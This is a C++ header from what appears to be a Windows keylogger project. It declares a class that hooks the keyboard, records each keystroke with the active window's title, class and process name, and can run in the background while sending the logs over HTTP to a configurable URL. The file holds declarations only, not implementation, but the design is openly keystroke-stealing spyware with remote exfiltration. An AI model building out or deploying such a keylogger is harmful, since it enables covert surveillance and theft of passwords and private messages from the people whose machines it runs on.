#include "transmiter_http.h"
#include "log_node.h"
#include <vector>
#include <string>
#include <windows.h>
#include <fstream>
#include <mutex>
#include <atomic>

class KeyloggerTest;

class Keylogger {
public:
	static Keylogger& get_instance();
	bool start(bool transmit = true, bool in_background = false, bool save_to_file = false);
	bool stop();
	bool set_transmiter_conf(std::string url, int retries, int frequency);

private:
	//tests
	friend class KeyloggerTest;

	//workers
	std::thread background_worker_;
	std::thread process_worker_;

	//state & config
	char sys_key_state = 0; //(LSB -b0) b2 - ctrl, b1 - shift, b0 - alt
	std::atomic<bool> listening_ = false;
	std::ofstream log_file_;
	//window state
	
	HWND active_window_handle_;
	
	//transmiter shared resoruces
	std::vector<std::unique_ptr<LogNode>> log_nodes_;
	LogNode active_log_node;
	std::mutex nodes_mutex_;

	TransmiterHTTP transmiter_http_;

	//process worker shared resources
	std::vector<std::pair<int, int>> keys_buffer_;
	std::mutex keys_buffer_mutex_;

	//keystroke delimiter
	const std::string k_delimiter = "\x1F";



	// Windows variables
	HHOOK keyboardHook = NULL;
	MSG msg;
private:

	//worker functions
	void listen_();
	void dispatch_message_();

	Keylogger();
	~Keylogger();

	bool set_hook();
	bool remove_hook();

	void log_key_(int vk_code, int wm_mode);
	LogNode* pick_log_(WindowInfo window_info, std::string time);
	LogNode* add_log(WindowInfo window_info, std::string time);
	std::string vk_to_string_(int vk_code);

	//window info and time
	WindowInfo get_active_window_info_();
	std::string get_active_window_title(std::string fallback);
	std::string get_active_window_class(std::string fallback);
	std::string get_active_window_procces_name(std::string fallback);
	std::string get_current_time_();
	std::string convert_to_utf8(wchar_t* data);

	void change_active_node(LogNode* node);

	std::string procces_key_(int vk_code, int wm_mode);
	bool update_modifiers_keys_(int vk_code, bool pressed);

	//windows methods
	static LRESULT CALLBACK keyboard_proc_(int nCode, WPARAM wParam, LPARAM lParam);
	
};